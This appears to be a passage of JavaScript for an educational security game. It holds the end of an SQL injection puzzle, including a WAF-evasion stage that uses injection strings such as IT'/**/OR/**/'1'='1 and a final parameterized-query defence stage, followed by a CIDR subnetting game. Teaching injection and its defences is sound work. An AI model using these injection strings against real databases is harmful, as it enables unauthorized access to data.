            stage: 4,
            title: 'CHAMBER #04: MULTI-LINE COMMENT EVASION',
            sub: 'Bypass a restrictive web application filter using inline multi-line comments.',
            queryHtml: `
                <span class="sql-keyword">SELECT</span> role <span class="sql-keyword">FROM</span> staff 
                <span class="sql-keyword">WHERE</span> dept = '<span class="sqli-slot" id="sqliSlot0" onclick="selectSqliSlot(0)">[ CLICK TO SELECT ]</span>' 
                <span class="sql-keyword">LIMIT</span> 1;
            `,
            numSlots: 1,
            tokens: ["IT'/**/OR/**/'1'='1", "Sales' #", "DEV' --", "' OR 1=1 --"],
            validate: (slots) => {
                const s0 = slots[0] || '';
                if (s0 === "IT'/**/OR/**/'1'='1" || s0 === "Sales' #") {
                    return { ok: true, explanation: "SUCCESS! Inline comment sequences `/**/` circumvent space-filtering WAF rules while preserving valid SQL grammar!" };
                }
                return { ok: false, explanation: "The WAF blocked standard spaces. Use inline comment evasion syntax `/**/` to bypass space inspection filters." };
            }
        },
        {
            stage: 5,
            title: 'CHAMBER #05: DEFENSE MODE (PARAMETERIZATION)',
            sub: 'Switch to defense! Neutralize SQL injection forever by replacing raw concatenation with parameterized placeholders.',
            queryHtml: `
                db.execute(<span class="sql-string">"SELECT * FROM users WHERE user = <span class="sqli-slot" id="sqliSlot0" onclick="selectSqliSlot(0)">[ CLICK TO SELECT ]</span> AND pass = <span class="sqli-slot" id="sqliSlot1" onclick="selectSqliSlot(1)">[ CLICK TO SELECT ]</span>"</span>, [req.user, req.pass]);
            `,
            numSlots: 2,
            tokens: ["?", "$1", "\" + req.user + \"", "' OR 1=1", "sanitize(req.user)"],
            validate: (slots) => {
                const s0 = slots[0] || '';
                const s1 = slots[1] || '';
                if (s0 === "?" && s1 === "?") {
                    return { ok: true, explanation: "VAULT SECURED! Parameterized queries (Prepared Statements with `?`) separate the SQL code grammar from the user input data. Attacks like `' OR 1=1` are treated purely as literal string values!" };
                }
                return { ok: false, explanation: "Select the parameterized query placeholders (`?`) for both fields to enforce strict separation of code and untrusted data." };
            }
        }
    ]
};

function initSqliLocksmith() {
    SqliLocksmith.stage = 1;
    SqliLocksmith.score = 0;
    loadSqliStage(1);
    updateSqliHUD();
}

function loadSqliStage(stageNum) {
    SqliLocksmith.stage = stageNum;
    const stageData = SqliLocksmith.stages[stageNum - 1];
    SqliLocksmith.slotValues = new Array(stageData.numSlots).fill(null);
    SqliLocksmith.activeSlotIndex = 0;

    // Vault UI Reset
    const door = document.getElementById('sqliVaultDoor');
    const lockIcon = document.getElementById('sqliLockIcon');
    const nextBtn = document.getElementById('sqliNextBtn');
    const statusVal = document.getElementById('sqliStatusVal');

    if (door) door.className = 'sqli-vault-door';
    if (lockIcon) {
        lockIcon.textContent = '🔒';
        lockIcon.className = 'sqli-lock-icon';
    }
    if (statusVal) {
        statusVal.textContent = 'LOCKED';
        statusVal.style.color = 'var(--accent-red)';
    }
    if (nextBtn) nextBtn.style.display = 'none';

    // Titles
    document.getElementById('sqliVaultTitle').textContent = stageData.title;
    document.getElementById('sqliVaultSub').textContent = stageData.sub;

    // Render Query Box
    const queryBox = document.getElementById('sqliQueryBox');
    if (queryBox) {
        queryBox.innerHTML = stageData.queryHtml;
    }

    // Render Tokens
    const tokensContainer = document.getElementById('sqliTokensContainer');
    if (tokensContainer) {
        tokensContainer.innerHTML = '';
        stageData.tokens.forEach(tok => {
            const btn = document.createElement('button');
            btn.className = 'sqli-token-pill';
            btn.textContent = tok;
            btn.onclick = () => insertSqliToken(tok);
            tokensContainer.appendChild(btn);
        });
    }

    // Reset evaluator
    const evalFeed = document.getElementById('sqliEvalFeed');
    if (evalFeed) {
        evalFeed.innerHTML = `
            <div class="sqli-eval-pill">
                <strong>OBJECTIVE:</strong> ${stageData.sub} Click a slot above and choose a token below.
            </div>
        `;
    }

    updateSqliSlotVisuals();
    updateSqliHUD();
}

function selectSqliSlot(idx) {
    CyberAudio.blip();
    SqliLocksmith.activeSlotIndex = idx;
    updateSqliSlotVisuals();
}

function updateSqliSlotVisuals() {
    const stageData = SqliLocksmith.stages[SqliLocksmith.stage - 1];
    for (let i = 0; i < stageData.numSlots; i++) {
        const slotEl = document.getElementById(`sqliSlot${i}`);
        if (slotEl) {
            const val = SqliLocksmith.slotValues[i];
            slotEl.textContent = val || `[ SLOT ${i + 1} ]`;
            if (val) {
                slotEl.classList.add('filled');
            } else {
                slotEl.classList.remove('filled');
            }
            if (i === SqliLocksmith.activeSlotIndex) {
                slotEl.style.borderColor = 'var(--accent-yellow)';
                slotEl.style.boxShadow = '0 0 8px var(--accent-yellow)';
            } else {
                slotEl.style.borderColor = '';
                slotEl.style.boxShadow = '';
            }
        }
    }
}

function insertSqliToken(tokenStr) {
    CyberAudio.blip();
    const stageData = SqliLocksmith.stages[SqliLocksmith.stage - 1];
    SqliLocksmith.slotValues[SqliLocksmith.activeSlotIndex] = tokenStr;

    // Automatically advance active slot to next empty slot if available
    for (let i = 0; i < stageData.numSlots; i++) {
        if (!SqliLocksmith.slotValues[i]) {
            SqliLocksmith.activeSlotIndex = i;
            break;
        }
    }

    updateSqliSlotVisuals();
}

function resetSqliSlots() {
    CyberAudio.blip();
    const stageData = SqliLocksmith.stages[SqliLocksmith.stage - 1];
    SqliLocksmith.slotValues = new Array(stageData.numSlots).fill(null);
    SqliLocksmith.activeSlotIndex = 0;
    updateSqliSlotVisuals();
}

function testSqliPayload() {
    const stageData = SqliLocksmith.stages[SqliLocksmith.stage - 1];
    const result = stageData.validate(SqliLocksmith.slotValues);

    const evalFeed = document.getElementById('sqliEvalFeed');
    const door = document.getElementById('sqliVaultDoor');
    const lockIcon = document.getElementById('sqliLockIcon');
    const statusVal = document.getElementById('sqliStatusVal');
    const nextBtn = document.getElementById('sqliNextBtn');

    if (result.ok) {
        CyberAudio.success();
        SqliLocksmith.score++;
        addArcadeXp(40);

        if (door) door.classList.add('unlocked');
        if (lockIcon) {
            lockIcon.textContent = '🔓';
            lockIcon.classList.add('unlocked');
        }
        if (statusVal) {
            statusVal.textContent = 'UNLOCKED / BYPASSED';
            statusVal.style.color = 'var(--accent-green)';
        }

        if (evalFeed) {
            evalFeed.innerHTML = `
                <div class="sqli-eval-pill" style="border-left-color: var(--accent-green); background: rgba(34, 197, 94, 0.1);">
                    <strong style="color: var(--accent-green);">[QUERY POPPED!]</strong><br>
                    ${result.explanation}
                </div>
            `;
        }

        if (nextBtn) nextBtn.style.display = 'inline-block';
    } else {
        CyberAudio.fail();
        if (evalFeed) {
            evalFeed.innerHTML = `
                <div class="sqli-eval-pill" style="border-left-color: var(--accent-red); background: rgba(239, 68, 68, 0.1);">
                    <strong style="color: var(--accent-red);">[QUERY REJECTED / SYNTAX ERROR]</strong><br>
                    ${result.explanation}
                </div>
            `;
        }
    }
    updateSqliHUD();
}

function nextSqliStage() {
    CyberAudio.blip();
    if (SqliLocksmith.stage < SqliLocksmith.stages.length) {
        loadSqliStage(SqliLocksmith.stage + 1);
    } else {
        // Completed all stages
        const evalFeed = document.getElementById('sqliEvalFeed');
        if (evalFeed) {
            evalFeed.innerHTML = `
                <div class="sqli-eval-pill" style="border-left-color: var(--accent-green); background: rgba(34, 197, 94, 0.15);">
                    <strong style="color: var(--accent-green);">🏆 MASTER VAULT BREAKER & DEFENDER!</strong><br>
                    You completed all 5 SQL injection chambers including full Parameterized Query defense. Outstanding comprehension of OWASP Top 10 Injection!
                </div>
            `;
        }
        const nextBtn = document.getElementById('sqliNextBtn');
        if (nextBtn) {
            nextBtn.textContent = '↺ REPLAY VAULTS';
            nextBtn.onclick = () => initSqliLocksmith();
        }
    }
}

function updateSqliHUD() {
    const stageVal = document.getElementById('sqliStageVal');
    const scoreVal = document.getElementById('sqliScoreVal');
    if (stageVal) stageVal.textContent = `${SqliLocksmith.stage} / ${SqliLocksmith.stages.length}`;
    if (scoreVal) scoreVal.textContent = SqliLocksmith.score;
}


// ── 7. GAME 4: CIDR BLOCK IMPLEMENTATION ──
const CidrGame = {
    parentBase: '192.168.1',
    parentTotalIps: 256,
    currentOffset: 0,
    ticketIndex: 0,
    selectedPrefix: 26,
    committedSubnets: [],

    tickets: [
        {
            dept: 'ENGINEERING WORKSTATIONS',
            needed: 55,
            icon: '💻',
            optimalPrefix: 26,
            desc: 'High-compute workstation pool requiring <strong>55 usable host IPs</strong>.'
        },
        {
            dept: 'CORPORATE VOIP PHONES',
            needed: 100,
            icon: '📞',
            optimalPrefix: 25,
            desc: 'Unified communications voice VLAN requiring <strong>100 usable host IPs</strong>.'
        },
        {
            dept: 'DEVOPS CI/CD RUNNERS',
            needed: 25,
            icon: '⚙️',
            optimalPrefix: 27,
            desc: 'Isolated automation runner segment requiring <strong>25 usable host IPs</strong>.'
        },
        {
            dept: 'ROUTER POINT-TO-POINT LINK',
            needed: 2,
            icon: '🌐',
            optimalPrefix: 30,
            desc: 'Serial inter-router uplink between core switch and ISP requiring exactly <strong>2 usable IPs</strong>.'
        }
    ],

    prefixDetails: {
        25: { total: 128, usable: 126, mask: '255.255.255.128' },
        26: { total: 64, usable: 62, mask: '255.255.255.192' },
        27: { total: 32, usable: 30, mask: '255.255.255.224' },
        28: { total: 16, usable: 14, mask: '255.255.255.240' },
        29: { total: 8, usable: 6, mask: '255.255.255.248' },
        30: { total: 4, usable: 2, mask: '255.255.255.252' }
    }
};

function initCidrBlock() {
    CidrGame.currentOffset = 0;
    CidrGame.ticketIndex = 0;
    CidrGame.selectedPrefix = 26;
    CidrGame.committedSubnets = [];

    renderCidrMap();
    renderCidrTicket();
    renderCidrTable();
    updateCidrHUD();
}

function renderCidrMap() {
    const bar = document.getElementById('cidrMapBar');
    if (!bar) return;
    bar.innerHTML = '';

    const colors = ['#3b82f6', '#10b981', '#f59e0b', '#8b5cf6', '#ec4899'];

    // Render committed subnets
    CidrGame.committedSubnets.forEach((sub, idx) => {
        const widthPct = (sub.total / CidrGame.parentTotalIps) * 100;
        const slice = document.createElement('div');
        slice.className = 'cidr-block-slice';
        slice.style.width = `${widthPct}%`;
        slice.style.background = colors[idx % colors.length];
        slice.title = `${sub.dept}: ${sub.cidr} (${sub.total} IPs)`;
        slice.innerHTML = `<span>${sub.cidr}</span><span style="font-size:0.55rem;opacity:0.85;">${sub.dept.split(' ')[0]}</span>`;
        bar.appendChild(slice);
    });

    // Render free space
    const remainingIps = CidrGame.parentTotalIps - CidrGame.currentOffset;
    if (remainingIps > 0) {
        const freePct = (remainingIps / CidrGame.parentTotalIps) * 100;
        const freeSlice = document.createElement('div');
        freeSlice.className = 'cidr-block-slice slice-free';
        freeSlice.style.width = `${freePct}%`;
        freeSlice.innerHTML = `<span>FREE: ${remainingIps} IPs</span>`;
        bar.appendChild(freeSlice);
    }
}

function renderCidrTicket() {
    const ticketBox = document.getElementById('cidrTicketBox');
    if (!ticketBox) return;

    if (CidrGame.ticketIndex >= CidrGame.tickets.length) {
        ticketBox.innerHTML = `
            <div style="text-align: center; padding: 20px;">
                <div style="font-size: 2.2rem; margin-bottom: 8px;">🏆</div>
                <h3 style="font-size: 1.2rem; color: var(--accent-green); margin-bottom: 6px;">SUBNET ALLOCATION MISSION COMPLETE</h3>
                <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 14px;">
                    All department subnets have been mapped and committed into the core routing table without IP overlap or excessive wastage.
                </p>
                <button class="pg-btn pg-btn-allow" style="padding: 10px 20px; font-size: 0.8rem; margin: 0 auto;" onclick="initCidrBlock()">
                    <span>↺ RESET NETWORK POOL</span>
                </button>
            </div>
        `;
        return;
    }

    const t = CidrGame.tickets[CidrGame.ticketIndex];
    document.getElementById('cidrDeptTitle').textContent = t.dept;
    document.getElementById('cidrDeptDesc').innerHTML = `${t.desc} Select the most optimal CIDR prefix below:`;

    const optionsContainer = document.getElementById('cidrPrefixOptions');
    if (optionsContainer) {
        optionsContainer.innerHTML = '';
        [25, 26, 27, 28, 29, 30].forEach(p => {
            const info = CidrGame.prefixDetails[p];
            const btn = document.createElement('button');
            btn.className = `cidr-opt-btn ${p === CidrGame.selectedPrefix ? 'active' : ''}`;
            btn.onclick = () => selectCidrPrefix(p);
            btn.innerHTML = `
                <div><strong>/${p}</strong></div>
                <div style="font-size: 0.65rem; opacity: 0.85;">${info.usable} Usable Hosts</div>
                <div style="font-size: 0.6rem; color: var(--text-muted);">${info.total} Total IPs</div>
            `;
            optionsContainer.appendChild(btn);
        });
    }
}

function selectCidrPrefix(prefix) {
    CyberAudio.blip();
    CidrGame.selectedPrefix = prefix;
    document.querySelectorAll('.cidr-opt-btn').forEach(btn => {
        if (btn.textContent.includes(`/${prefix}`)) {
            btn.classList.add('active');
        } else {
            btn.classList.remove('active');
        }
    });
}

function commitSubnetAllocation() {
    if (CidrGame.ticketIndex >= CidrGame.tickets.length) return;
    const t = CidrGame.tickets[CidrGame.ticketIndex];
    const prefixInfo = CidrGame.prefixDetails[CidrGame.selectedPrefix];

    // Check if prefix can accommodate needed hosts
    if (prefixInfo.usable < t.needed) {
        CyberAudio.fail();
        alert(`ALLOCATION ERROR: /${CidrGame.selectedPrefix} only provides ${prefixInfo.usable} usable hosts, but ${t.dept} needs at least ${t.needed}! Choose a larger prefix.`);
        return;
    }

    // Check if over-allocated too wastefully
    if (CidrGame.selectedPrefix < t.optimalPrefix) {
        CyberAudio.alert();
        alert(`OVER-ALLOCATION WARNING: /${CidrGame.selectedPrefix} provides ${prefixInfo.usable} hosts for a request of only ${t.needed}! This wastes excessive address space. An optimal prefix exists!`);
        return;
    }

    // Check if remaining pool has enough space
    if (CidrGame.currentOffset + prefixInfo.total > CidrGame.parentTotalIps) {
        CyberAudio.fail();
        alert(`EXHAUSTION ERROR: Not enough contiguous IP addresses left in 192.168.1.0/24 to fit ${prefixInfo.total} addresses!`);
        return;
    }

    // Subnet boundary alignment check (must be aligned to multiple of total)
    if (CidrGame.currentOffset % prefixInfo.total !== 0) {
        // Find next aligned boundary
        const alignedOffset = Math.ceil(CidrGame.currentOffset / prefixInfo.total) * prefixInfo.total;
        if (alignedOffset + prefixInfo.total > CidrGame.parentTotalIps) {
            CyberAudio.fail();
            alert(`BOUNDARY ALIGNMENT ERROR: Subnet size ${prefixInfo.total} must start at an address multiple of ${prefixInfo.total}!`);
            return;
        }
        CidrGame.currentOffset = alignedOffset;
    }

    // Successful allocation
    CyberAudio.success();
    const netId = `${CidrGame.parentBase}.${CidrGame.currentOffset}`;
    const broadcastId = `${CidrGame.parentBase}.${CidrGame.currentOffset + prefixInfo.total - 1}`;
    const firstUsable = `${CidrGame.parentBase}.${CidrGame.currentOffset + 1}`;
    const lastUsable = `${CidrGame.parentBase}.${CidrGame.currentOffset + prefixInfo.total - 2}`;

    CidrGame.committedSubnets.push({
        dept: t.dept,
        cidr: `${netId}/${CidrGame.selectedPrefix}`,
        mask: prefixInfo.mask,
        range: `${firstUsable} - ${lastUsable}`,
        broadcast: broadcastId,
        total: prefixInfo.total,
        usable: prefixInfo.usable
    });

    CidrGame.currentOffset += prefixInfo.total;
    CidrGame.ticketIndex++;
    addArcadeXp(40);

    renderCidrMap();
    renderCidrTicket();
    renderCidrTable();
    updateCidrHUD();
}

function renderCidrTable() {
    const feed = document.getElementById('cidrTableFeed');
    if (!feed) return;
    if (CidrGame.committedSubnets.length === 0) {
        feed.innerHTML = `
            <div class="cidr-card-item" style="color: var(--text-muted); text-align: center; padding: 20px;">
                No subnets committed yet. Fulfill department requests on the left to carve out routing segments.
            </div>
        `;
        return;
    }

    feed.innerHTML = '';
    CidrGame.committedSubnets.forEach((sub, idx) => {
        const item = document.createElement('div');
        item.className = 'cidr-card-item';
        item.innerHTML = `
            <div style="display: flex; justify-content: space-between; font-weight: 800;">
                <span style="color: var(--accent-cyan);">#${idx + 1} ${sub.dept}</span>
                <span style="color: var(--accent-green);">${sub.cidr}</span>
            </div>
            <div style="font-size: 0.65rem; color: var(--text-muted);">
                MASK: ${sub.mask} &bull; BROADCAST: ${sub.broadcast}
            </div>
            <div style="font-size: 0.65rem; color: #94a3b8;">
                USABLE RANGE: ${sub.range} (${sub.usable} hosts)
            </div>
        `;
        feed.appendChild(item);
    });

    const countEl = document.getElementById('cidrSubnetCount');
    if (countEl) countEl.textContent = `${CidrGame.committedSubnets.length} SUBNET(S)`;
}

function updateCidrHUD() {
    const freeIps = CidrGame.parentTotalIps - CidrGame.currentOffset;
    const usagePct = Math.round((CidrGame.currentOffset / CidrGame.parentTotalIps) * 100);

    const freeEl = document.getElementById('cidrFreeIpVal');
    const compEl = document.getElementById('cidrCompleteVal');
    const badgeEl = document.getElementById('cidrUsageBadge');

    if (freeEl) freeEl.textContent = `${freeIps} / 256`;
    if (compEl) compEl.textContent = `${CidrGame.ticketIndex} / ${CidrGame.tickets.length}`;
    if (badgeEl) badgeEl.textContent = `${usagePct}% UTILIZED`;
}
